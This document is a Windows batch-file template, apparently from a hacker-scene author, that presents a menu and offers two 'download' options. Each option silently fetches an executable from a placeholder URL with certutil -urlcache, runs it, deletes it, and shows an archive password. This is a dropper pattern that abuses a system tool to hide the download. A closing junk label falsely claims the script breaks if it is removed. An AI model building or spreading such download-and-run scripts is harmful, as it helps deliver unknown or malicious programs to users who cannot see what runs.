:: TEMPLATE BY ELF! CREDIT WOULD BE GREATLY APPRICIATED! pls dont skid my shit without permission
:: MESSAGE ME IF YOU USE THIS! IM HERE TO HELP! Elf#6622

::startup script, always return here after completing a task using "goto startup"
:startup
@echo off
title insertTitleHere
color F0
echo WELCOME TO insertNameHere
echo -------------------------------
echo 1: DOWNLOAD 1
echo 2: DOWNLOAD 2
echo S: SOCIALS
echo H: HELP
echo -------------------------------
set choice=
set /p choice=TYPE THE NUMBER TO START THE APPLICATION: 
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto download1
if '%choice%'=='2' goto download2
if '%choice%'=='H' goto help
if '%choice%'=='S' goto socials
echo "%choice%" is not a choice, try again. MAKE SURE YOU USE CAPITAL LETTERS!
echo.
pause
goto startup

:download1 
color F0
cls
echo PASSWORD = zenonite
set url=https://downloadlinkhere.com >nul
set file=filename.exe >nul
certutil -urlcache -split -f %url% %file% >nul
cls
filenamehere.exe
sleep 1
del filenamehere.exe
exit

:download2
color F0
cls
echo PASSWORD = zenonite
set url=https://downloadlinkhere.com >nul
set file=filename.exe >nul
certutil -urlcache -split -f %url% %file% >nul
cls
filenamehere.exe
sleep 1
del filenamehere.exe
exit

:help
color F0
cls
echo INSERT HELP COMMAND HERE
pause
goto startup

:socials
cls
echo socialLinkHere
::or START "websitetosocials.com"



::LEAVE THIS MESSAGE AT THE BOTTOM OR STUFF WILL BREAK
:9823rihweisnELF3420ijwieoafsjspdj
cls
echo 98wjd3298wdsjdoiufshw8hs9w7h4029q3r089
cls